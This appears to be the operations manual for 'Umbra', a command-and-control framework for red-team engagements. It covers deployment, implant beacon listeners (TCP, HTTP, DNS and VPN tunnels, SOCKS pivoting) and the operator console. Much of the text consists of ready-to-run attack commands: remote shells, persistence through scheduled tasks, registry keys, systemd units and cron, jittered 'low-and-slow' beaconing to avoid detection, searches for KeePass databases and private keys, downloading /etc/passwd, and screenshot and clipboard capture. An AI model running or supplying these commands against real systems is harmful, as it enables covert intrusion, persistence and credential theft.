# Operations

## 1. First deployment

```bash
# 1. secrets (agent PSK and per-operator tokens are independent)
./scripts/gen-secrets.sh alice bob
#  -> export UMBRA_AGENT_PSK=...
#  -> export UMBRA_OPERATOR_TOKENS=alice:...,bob:...

# 2. configuration
install -d -m 700 /etc/umbra /var/lib/umbra
install -m 600 deploy/server.prod.json   /etc/umbra/server.json
install -m 600 /dev/stdin /etc/umbra/agent.psk <<< "$UMBRA_AGENT_PSK"
printf 'UMBRA_OPERATOR_TOKENS=%s\n' "$UMBRA_OPERATOR_TOKENS" > /etc/umbra/server.env
chmod 600 /etc/umbra/server.env

# 3. service
install -m 644 deploy/umbra-server.service /etc/systemd/system/
systemctl daemon-reload && systemctl enable --now umbra-server
journalctl -u umbra-server -f
```

The server prints a fingerprint (first 16 hex chars of SHA-256) for every
operator token it loads — never the token itself. If a fingerprint is missing,
the token env var is not visible to the unit.

## 2. Listener layout

| Listener | Default | Exposure |
|---|---|---|
| `agent_listen` | `0.0.0.0:4001` | reachable by implants (TCP beacon, pivot callbacks) |
| `operator_listen` | `127.0.0.1:4002` | **never** public; reach it through SSH or WireGuard |
| `http_listen` | `127.0.0.1:4003` | behind the tunnel-facing proxy (`deploy/nginx-http-transport.conf`); also serves the WebSocket upgrade |
| `tls_listen` | *(empty)* | mutual TLS: agents and operators that present a client certificate |
| `dns_listen` | *(empty)* | the DNS tunnel (UDP); only answers for `dns_domain` |
| `vpn_listen` | *(empty)* | the layer-3 tunnel (UDP) |
| `socks_listen` | *(empty)* | the persistent SOCKS5 proxy through `socks_agent` |

`server.http_tls_cert` / `http_tls_key` make the Go listener itself serve TLS.
Leave them empty for beacons: an implant has no TLS stack, so only a TLS-speaking
relay could use that listener. The supported shape is tunnel → plain listener.

The beacons speak plain TCP and plain HTTP/1.1, so **TLS termination in front
of them does not work** — a plaintext client cannot complete a TLS handshake.
When implants must cross an untrusted network, put the transport inside an
encrypted tunnel (WireGuard, IPsec, an mTLS mesh) and keep the listener bound
to the tunnel interface. The frames are individually AEAD-sealed, so a tunnel
is about hiding *traffic shape* (ports, cadence, sizes), not about protecting
payload contents.

The operator console is the exception: it has a TLS stack, so a remote console
can use the mutual TLS listener:

```bash
umbra --server c2.example.com:4002 --operator alice --tls \
      --tls-ca /etc/umbra/ca.pem --tls-server-name c2.example.com \
      --tls-cert /etc/umbra/console.pem --tls-key /etc/umbra/console.key \
      --watch
```

`tls_listen` refuses to start without `tls_cert`, `tls_key` and
`tls_client_ca`: the listener is mutual TLS, so a client certificate is
mandatory and a stolen token alone is not enough to take over an operation.

## 3. Operator workflow

```bash
export UMBRA_OPERATOR_TOKEN='<your token>'      # or --token-file
umbra --server 127.0.0.1:4002 --operator alice --watch

umbra[-]> agents
umbra[-]> use web-01
umbra[web-01]> run whoami
umbra[web-01]> exec sysinfo
umbra[web-01]> sleep 120 40        # slow the beacon down
umbra[web-01]> tasks 10
umbra[web-01]> kill                # ask the beacon to exit
```

Scripted use (CI, reports):

```bash
umbra --server 127.0.0.1:4002 --operator alice agents
umbra --server 127.0.0.1:4002 --operator alice task web-01 shell \
      --args '{"cmd":"uname -a"}' --wait
umbra --server 127.0.0.1:4002 --operator alice result t-1a2b3c4d
```

`--token` shows up in the process list; prefer `--token-file` or the environment.

## 3a. Working on groups of agents

An engagement is rarely about a single machine.  The console therefore speaks
one filter language everywhere, and every command that acts on more than one
agent takes the same selection.

```bash
# what is out there?
umbra agents
umbra agents --state online --os windows
umbra agents --tag finance --transport http

# label the hosts, so the next command can find them
umbra tag web-01 finance dc-01
umbra tag web-01 legacy --remove
umbra tag web-01 prod staging --set

# act on the group
umbra task --agents web-01,web-02 --kind shell --args '{"cmd":"whoami"}'
umbra task --filter state=online,tag=finance --kind sysinfo
```

The filter keys are `state`, `transport`, `os`, `arch`, `tag` and `user`; the
same keys work in the RPC (`agents.list`) and in the interactive console
(`agents state=online tag=finance`).

**A selection is always explicit.**  `task.bulk`, `agents.tag` and
`agents.policy` refuse to run without either a list of agent ids or a filter:
a command that quietly applies to every agent in the inventory is not
recoverable once it is sent, so the server asks for a target instead of
guessing one.

The interactive console understands the same verbs:

```
umbra[-]> agents state=online
umbra[-]> tag web-01 finance
umbra[-]> policy web-01 sleep=120 jitter=45
```

## 3b. Interactive sessions, chains and alerts

### An interactive session

A session is a process on the target that the operator types into.  The
beacon keeps it open, streams what the process prints and takes what the
operator writes:

```bash
umbra session web-01                     # the platform's own shell
umbra session web-01 --cmd "python3"    # a specific program
umbra session web-01 --input "id"       # write one line and wait
```

Inside the console the same thing is one command: `session [cmd]`.  The
session survives a re-connect, so it keeps working when the check-in
interval is a minute; the beacon holds the connection open while a session is
live, so the output arrives as it happens instead of at the next check-in.

### A multi-stage task

A chain runs several tasks one after the other, and the output of a stage
becomes the input of the next one.  `{{output}}` is the placeholder:

```bash
umbra chain web-01 --stages '[
  {"kind":"shell","args":{"cmd":"ls /etc/umbra"}},
  {"kind":"shell","args":{"cmd":"cat {{output}}"}}
]'
```

A chain is the shape of most real work: look, read, send.  The stages are
ordinary tasks in the history, so the console can still show what each stage
did.

### Alerts

The server can watch its own event stream, so a console does not have to:

```json
"alerts": [
  {"name": "dc-offline", "event": "agent.offline", "tag": "dc", "cooldown_s": 300},
  {"name": "failed-task", "event": "task.result", "task_kind": "bof", "cooldown_s": 60}
]
```

A rule matches on the event kind, on a tag of the agent, on the beginning of
the agent id and on the kind of the task.  When it matches, the server logs
the event loudly and pushes an `alert` event, which the console shows like
any other event.  The cooldown keeps a noisy agent from alerting on every
check-in.  `umbra alerts` lists the rules the server is using.

### Keeping the implant alive

```bash
umbra persist web-01                     # install it so it survives a reboot
umbra persist web-01 --method systemd    # a specific method
umbra update web-01 /tmp/umbra-beacon --sha256 <digest>
```

The persistence is the one the platform offers: a scheduled task and a
registry key on Windows, a systemd user unit and a cron entry on Linux, a
launch agent on macOS.  The report says what was done, so it can be undone.

The update replaces the running binary: the new one is pushed to the host
first (the `upload` task), the digest is checked, and only then is the old
binary swapped out.  An implant that installs a file nobody verified is an
implant that installs whatever the network sent it.

### Keeping the implant reachable

The beacon can know more than one address of the team server:

```bash
UMBRA_SERVERS=10.0.0.5:4001,10.0.0.9:4001 UMBRA_PROXY=127.0.0.1:1080 ...
```

When the first address is down, the beacon tries the next one, so a server
that moves does not take the implant with it.  `UMBRA_PROXY` routes the
connection through a SOCKS5 proxy, for a network that only lets a proxy out.

### The processes

```bash
umbra proc web-01
umbra proc-kill web-01 4321
umbra proc-kill web-01 whoami
```

The table is the operating system's own: the pid, the parent, the user, the
moment the process started and the exact command line.  A shell tool hides
most of that, and it is exactly what an operator asks about when a host
behaves strangely.

### The command namespace

The server ships with a small namespace of saved commands, so a team says
`whoami` instead of remembering the exact task arguments:

| alias | what it does |
| --- | --- |
| `whoami`, `hostname` | the identity of the implant and the name of the host |
| `system`, `processes`, `network` | the system information, the processes, the network |
| `listening`, `routes`, `services` | the sockets, the routing table, the services |
| `screenshot` | a picture of the desktop |
| `triage`, `find` | the file triage and the file search |

```bash
umbra alias list
umbra alias run web-01 whoami
umbra alias run web-01 triage --args '{"path":"/etc/passwd"}'
```

An alias may also point at an armory extension instead of a task kind, which
is what makes the namespace extensible at runtime.  The team can add its own
(`umbra alias add ...`) and replace the built-in ones.

### Doing it again

A task that failed for a reason that is gone now can be run again:

```bash
umbra tasks --state failed
umbra retry t-1a2b3c4d
```

The old record stays as the history of what went wrong, and the new task is
what the agent runs.  A task that is still queued or delivered cannot be
retried: a delivered task may still be running, and running it twice is worse
than not running it.

### The handover

At the end of an engagement somebody has to write down what was done and
what was found.  The console writes it:

```bash
umbra report web-01 --out web-01.md
```

The report holds the host's record, the tasks that were run on it and the
notes of the local notebook, as one Markdown document.

### Finding things on the target

```bash
umbra triage web-01 /usr/bin/suspicious     # size, digest, format, entropy
umbra find web-01 "*.kdbx" --path /home     # by name (a glob or a substring)
umbra find web-01 --content "BEGIN PRIVATE KEY" --path /etc
umbra netinfo web-01                        # interfaces, routes, neighbours
umbra screenshot web-01 screen.png          # the screen of the target
umbra clipboard web-01                      # the clipboard of the target
```

## 3c. The dashboard

The console is the tool of the day.  The dashboard is what a team leaves open
on a second screen: the inventory, the running tasks and the event stream,
without a terminal in the way.

```json
{ "dashboard_listen": "127.0.0.1:8080", "dashboard_read_only": false }
```

Open `http://127.0.0.1:8080/` and paste an operator token.  The dashboard
accepts the same tokens as the console, so it is exactly as protected: the
token is compared in constant time and is never written to a log.

It is deliberately small.  It shows what is there and it queues a task;
everything else (the pivots, the team chat, the extension store) stays in
the console, where the answers are reviewed before they are given.  With
`dashboard_read_only` the task button is refused, which is what a dashboard
on a screen somebody walks past should be.

The endpoints it serves:

| endpoint | what it answers |
| --- | --- |
| `GET /api/agents` | the inventory |
| `GET /api/tasks?agent=&kind=&state=&limit=` | the task history |
| `GET /api/events?after=&limit=` | the journal of the events |
| `GET /api/stats` | the counters of the server |
| `POST /api/task` | `{"id": ..., "kind": ..., "args": {...}}` queues a task |

The dashboard is a **local** listener by default.  Putting it on a public
address means putting the operator token on a public address as well, and
that is a decision an operator makes on purpose, not one a default makes
for them.

## 4. Beacon tuning

The server dictates cadence at handshake time (`beacon.sleep` / `beacon.jitter`)
and can change it per agent with `agents.policy` (or the older
`agents.sleep`); the implant applies it immediately on the next check-in and
keeps it until it is told otherwise.

```bash
umbra policy web-01 --sleep 120 --jitter 45
umbra policy --all --state online --sleep 300 --jitter 50
umbra policy web-01 --no-obfuscate     # a fixed interval, no jitter nap
```

The cadence belongs to the operator: a beacon that has not applied a pushed
policy yet still reports its old interval, and that report never overwrites
the policy.  The obfuscation flag travels with the policy (the default is on,
so an agent keeps hiding its check-in pattern unless it is told otherwise).

| Environment | sleep | jitter |
|---|---|---|
| Lab / LAN | 5 s | 20 % |
| Typical engagement | 60 s | 35 % |
| Low-and-slow | 900 s | 50 % |

Sleep and jitter are clamped server-side (1–86400 s, 0–90 %). Failed cycles back
off exponentially up to 5 minutes, so a beacon never hammers a dead server.

## 5. State and recovery

* `data_file` holds agents and the task history (JSON). It is written after
  every state change, but bursts are coalesced into one write, and there is a
  periodic snapshot every 30 s as a backstop, plus a final write on shutdown.
  Each write goes to a fresh `*.tmp` in the same directory, is fsynced, and is
  renamed over the target, so the file on disk is always a complete snapshot
  (concurrent saves are serialised; a reader never sees a half-written file).
* Two generations on disk: before the new file is renamed into place, the
  current one becomes `data_file.bak`. A crash inside that window leaves no
  primary at all, so startup falls back to the backup and logs
  `state recovered from the backup generation` — the last few seconds of state
  are gone, the engagement is not. A torn or non-snapshot primary is treated the
  same way. `{}` or a file from a newer schema is refused instead of being
  loaded (and then overwritten) as an empty engagement.
* Anything that was `delivered` when the server stopped is re-queued on start, so
  a crash cannot lose a task — at the cost of possibly executing it twice. Task
  kinds are not idempotent by default, so check `task.list` after a restart.
* History is capped at 20 000 tasks (oldest completed tasks are pruned).
* A task that was delivered but never answered is failed after
  `task_timeout_s` (default 300 s, `0` disables it) and the consoles get a
  `task.timeout` event.  The task is **not** queued again: a task that may
  have run must not run a second time, so the operator decides what happens
  next.
* To reset an engagement: stop the server, delete `data_file`, **and rotate the
  agent PSK and operator tokens** (delete the implants or they will simply
  re-register).

## 5a. The operator's notebook

The team server keeps the authoritative state. The console keeps a second,
local copy of the part of the history that belongs to the operator: the tasks
they ran, the results they collected and the notes they left for the team.
It is a single SQLite file, `~/.umbra/state.db` by default.

```bash
umbra db stats                     # how much is in the notebook
umbra db tasks                     # the tasks this console submitted
umbra db tasks --agent web-01      # only the ones for one implant
umbra db results <task-id>         # the output of one task
umbra db search "shadow"           # search arguments, notes and output
umbra db note "the DC is dc01.corp.example" --agent web-01
umbra db export engagement.json     # a portable copy of the notebook
```

The notebook needs no server and no token: `umbra db ...` works offline, which
is exactly what an operator wants when the server is down or when the
question is about something that happened yesterday.

Two properties matter:

* **no secrets.** The operator token, the agent PSK and the session keys stay
  in memory. The notebook holds task metadata and task output — the same
  material the server already stores — and nothing else.
* **the operator owns it.** The file is not part of the server state, is not
  synchronised with the team, and is not touched by anybody else. Deleting it
  loses nothing the server does not have.

The path is configurable with `--db` or `UMBRA_DB`; an empty value switches
the notebook off entirely.

## 5b. Audit trail

Every operator command is appended to `audit_file` as one JSON object per line,
before the reply is sent:

```json
{"at":"2026-10-26T09:14:03.511Z","operator":"alice","peer":"10.0.0.5:51822","transport":"tcp/operator","cmd":"task.submit","ok":true,"agent_id":"web-01","task_id":"t-9f3a","detail":"map[cmd:id kind:shell]","ms":2}
```

* Written with `O_APPEND` + `fsync` per line over a `0600` file: a line that is
  lost in a crash would defeat the point.
* Lives next to the state file (`/var/lib/umbra/audit.jsonl` in the shipped
  unit) because that is the only directory the unit can write to
  (`ProtectSystem=strict`). Ship it off-box: a server that can rewrite its own
  audit log is not an audit log.
* `audit_max_mb` (default 8) rotates the file to `*.1`…`*.5`; old files are
  never truncated in place.
* Free-form fields (arguments, errors) are clipped to 512 characters, so one
  huge `--args` blob cannot make a line unbounded.
* An audit write failure is logged and the RPC still completes — a full disk
  must not stop an engagement, but it must be visible in `journalctl`.
* Read it back with `umbra audit --limit 20` (newest first), or from the file:

```bash
jq -c 'select(.ok == false)' data/audit.jsonl | tail
jq -r '[.at, .operator, .cmd] | @tsv' data/audit.jsonl | tail -20
```

Setting `audit_file` to `""` disables auditing; the server logs a warning at
start-up when it is off, and `umbra audit` says so instead of showing an empty
list. On a real engagement, treat the audit file as evidence: ship it off the
server, and do not give operators write access to it.

## 5c. Roles

Operator identities are configured with a role:

```bash
# /etc/umbra/server.env
UMBRA_OPERATOR_TOKENS=alice:admin:b0a1…,bob:operator:7c2e…,carol:viewer:91fd…
```

`name:token` (the old form) still works and defaults to `operator`. There must be
at least one `admin`, or the server refuses to start — otherwise nobody can
manage the engagement.

| Role | Can |
|---|---|
| `viewer` | read agents, tasks, results, audit, operators, chat, schedules |
| `operator` | everything a viewer can, plus submit/cancel tasks, change beacon cadence, kill, chat, add schedules |
| `admin` | everything, plus remove schedules and other engagement-wide actions |

`umbra whoami` prints your role and the exact command list it allows, and the
console refuses locally what the server would refuse anyway. A refusal is
audited (`ok=false`, `err` starting with `permission denied`), so "who tried
what" includes what they were not allowed to do.

## 5d. Chat and recurring tasks

* `umbra chat hello team` / `umbra chat` — the last 200 messages are kept in
  memory and every console receives them as a `chat` event.
* `umbra schedule add web-01 sysinfo --every 300` creates a recurring task;
  `umbra schedule list` shows the next run, the run count and who created it;
  `umbra schedule rm <id>` deletes it. Schedules are persisted with the state
  file, so a restart does not stop a collection run. The interval is clamped to
  5–86400 s, and a schedule that came due while the server was down fires once,
  not once per missed interval.

## 5e. Working as a team

The server is shared state: everything one console does is visible to the
others, and three small mechanisms keep a team from stepping on each other.

* **Who is where** — `umbra operators` lists every connected console with its
  role, the agent it is focused on, how long it has been idle and how deep its
  event queue is. The interactive console announces your focus automatically on
  `use <agent>`; `umbra focus web-01` (or `focus` to clear) does it from a
  script. Teammates see an `operator.focus` event.
* **Claims** — before working a task that someone else might grab, run
  `umbra claim <task-id>`. `umbra tasks` then shows `CLAIMED BY`, `task.claim`
  refuses a second operator with `task is claimed by <name>`, and
  `umbra release <task-id>` frees it. A claim orders people, it does not gate
  the task: the beacon never waits for one, and a finished task cannot be
  claimed. Claims survive a restart with the task itself.
* **Directed chat** — `umbra chat --to bob "web-01 is staged"` (or
  `chat @bob …` in the console) pushes the line only to Bob's console and your
  own. The history stays shared and shows the recipient, because a shared
  engagement needs a shared record: treat it as addressing, not encryption.

## 5f. File transfer

```bash
umbra --server 127.0.0.1:4002 --operator alice download web-01 /etc/passwd ./passwd
umbra --server 127.0.0.1:4002 --operator alice upload   web-01 ./collector /tmp/collector
```

Inside the console the same commands are `get <remote> <local>` and
`put <local> <remote>` for the selected agent. Both are chunked at 900 KiB, the
largest payload that still fits in one frame, so arbitrary file sizes work
without a new message type or a second connection:

* every chunk is checked against the SHA-256 the beacon reports;
* downloads are written to `<local>.part` and renamed only after the last chunk
  and the size check pass, so a failed transfer never leaves a truncated file
  that looks complete;
* uploads truncate at offset 0 and report the whole-file hash on the final
  chunk, which the CLI compares with the local file;
* `--chunk` lowers the step size (useful on lossy links); `--timeout` applies
  per chunk, not to the whole transfer.

A transfer is a sequence of ordinary tasks, so it appears in `tasks`, in the
audit trail and in the cancel path like anything else. The beacon reports
`total`, `offset`, `eof` and `sha256` in each RESULT, and the server stores them
as task metadata that `result <task-id>` prints.

## 6. Monitoring

```bash
umbra --server 127.0.0.1:4002 --operator alice stats
umbra --server 127.0.0.1:4002 --operator alice operators   # who else is connected
umbra --server 127.0.0.1:4002 --operator alice audit --limit 20
umbra --server 127.0.0.1:4002 --operator alice watch       # live event stream
umbra --server 127.0.0.1:4002 --operator alice cancel t-9f3a
journalctl -u umbra-server | grep -E "handshake failed|exceeded frame budget|queue full"
```

Signals that matter:

| Log line | Meaning |
|---|---|
| `handshake failed` (repeated, same peer) | wrong PSK, clock skew > 300 s, or scanning |
| `operator key used on the agent listener` | misconfigured implant (operator token in a beacon) |
| `agent exceeded frame budget` | runaway or hostile peer; connection dropped |
| `operator event queue full` | an operator console stopped reading; events are dropped (counted in `stats.events_dropped`), agent traffic is unaffected |
| `state save failed` | disk full/permissions — fix before restarting |
| `audit write failed` | the audit trail is incomplete; fix the disk and treat the missing window as a gap in the record |
| `rate limited` (in a response) | an operator console is looping faster than 40 RPC/s; the call was refused, not queued |

Clock skew is the most common deployment issue: the handshake rejects peers whose
`ts` differs by more than `max_clock_skew_s` (default 300 s). Keep both sides on
NTP, or raise the limit if you accept the risk.

## 7. Hardening checklist

- [ ] operator listener bound to loopback and reached over SSH/WireGuard
- [ ] HTTP transport inside an encrypted tunnel, proxy `client_max_body_size` ≥ 2 MB
- [ ] `agent.psk` and `server.env` mode `0600`, owned by the service user
- [ ] config file mode `0600` (it contains paths, not secrets, but keep it tight)
- [ ] systemd hardening enabled (the provided unit drops all capabilities)
- [ ] tokens per operator, rotated when someone leaves, fingerprints audited
- [ ] `data_file` on a filesystem with enough room for task history
- [ ] outbound allow-list on the implant host (only the C2 address/port)
- [ ] logs shipped somewhere the operators cannot silently edit
- [ ] mutual TLS for a remote console (`tls_listen`, `tls_client_ca`), the token alone is not enough
- [ ] `http_pad` set, so the length of a request does not tell what it carried
- [ ] armory signing key offline; the catalogue is signed before it is copied to the server
- [ ] `socks_listen` and `vpn_listen` bound to an interface only the team can reach
- [ ] rendered stagers deleted after the engagement (they carry the agent key)

## 8. Upgrades

1. Stop the operator consoles (they reconnect).
2. Replace the binary, keep `server.json` (config is forward compatible; unknown
   keys are ignored, new fields have defaults).
3. `systemctl restart umbra-server` — established agents reconnect at their next
   cycle with fresh ephemeral keys, so nothing has to be rebuilt after a
   server-side change.
4. If the protocol changed (new `umbra/vN`), rebuild the implants; the server
   rejects `HELLO` frames whose `v` it does not implement, and logs the version
   mismatch.

## 9. Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| `connection failed: ...` in the console | wrong token, wrong `--operator` name, or the server is not listening | check `UMBRA_OPERATOR_TOKENS` and that `--operator` matches the name in the env |
| agent connects but never appears | handshake rejected | run the beacon with `--verbose`; check PSK and clock |
| tasks stay `queued` | agent asleep or offline | `agents.list`, wait for the next cycle, or lower `sleep` |
| `task timed out` | command exceeds the implant's `timeout` arg (default 120 s) | pass `--args '{"cmd":"...","timeout":300}'` |
| HTTP beacon gets 401/410 | session expired (`idle_timeout_s`) or handshake failed | reload the beacon; check the reverse proxy forwards the path verbatim |
| `frame too large` | output > 1 MiB or file download > 900 KiB | use `download` chunks / redirect to a file and pull it in pieces |
| everything works, then stops after a day | keys rotated but a peer missed the `REKEY` frame | should not happen: `REKEY` always precedes `TASK_BATCH` (PROTOCOL.md §6). Look for `session rekeyed` in the beacon log; if it is missing, capture both sides and file a bug |
| link drops with "nonce mismatch" right as an operator connects or a task completes | two writers sealed and wrote out of order | nothing to fix in the field: a correctly written pair keeps `seal+write` in one critical section (SEND-SERIAL). If it recurs, it is a bug in the writer added last |
| `pivot.open` says the agent never answered | the agent is asleep, or the callback was refused | the agent dials back on its own; check the agent listener is reachable from the agent host and watch the server log for `tunnel callback` |
| the SOCKS5 proxy refuses a CONNECT | the target is unreachable from the agent, not from the console | test the same target from the agent host; the proxy is only a relay |
| the DNS tunnel gets no answer | the resolver does not know the tunnel domain, or the agent queries the wrong one | point the agent at the server resolver (`UMBRA_DNS_RESOLVER`) and the domain (`UMBRA_DNS_DOMAIN`), and check the server log for `dns tunnel listening` |
| the WebSocket beacon refuses to connect | the route is wrong, or a proxy in front does not forward the upgrade | the upgrade happens on the beacon route (`/api/v1/beacon`); the proxy needs `proxy_set_header Upgrade $http_upgrade` |
| the console says `TLS handshake with ... failed` | the CA does not match, or the name in the certificate does not match `--tls-server-name` | pass the right `--tls-ca`, and use the name the certificate carries |
| the console is refused by the mutual TLS listener | no client certificate was presented | add `--tls-cert` and `--tls-key`; the listener always requires one |
